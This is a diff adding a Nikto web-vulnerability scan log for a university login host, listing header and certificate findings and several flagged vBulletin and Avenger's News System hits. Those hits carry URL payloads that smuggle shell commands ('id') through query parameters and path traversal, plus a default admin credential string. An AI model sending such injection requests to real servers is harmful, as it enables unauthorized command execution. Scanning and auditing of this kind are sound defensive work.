@@ -1,0 +1,17 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: idp.it.tuwien.ac.at
++ Target Port: 443
++ GET /: Uncommon header 'x-frame-options' found, with contents: DENY
++ GET /: Uncommon header 'strict-transport-security' found, with contents: max-age=31536000
++ GET /robots.txt: Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x5fa252768b925 
++ GET //: File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ GET /robots.txt: "robots.txt" contains 1 entry which should be manually viewed.
++ GET /: Hostname 'idp.it.tuwien.ac.at' does not match certificate's CN 'login.tuwien.ac.at'
++ GET /WEB-INF/web.xml: /WEB-INF/web.xml: JRUN default file found.
++ -3299: GET /forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -724: GET /ans.pl?p=../../../../../usr/bin/id|&blah: /ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
++ -724: GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah: /ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
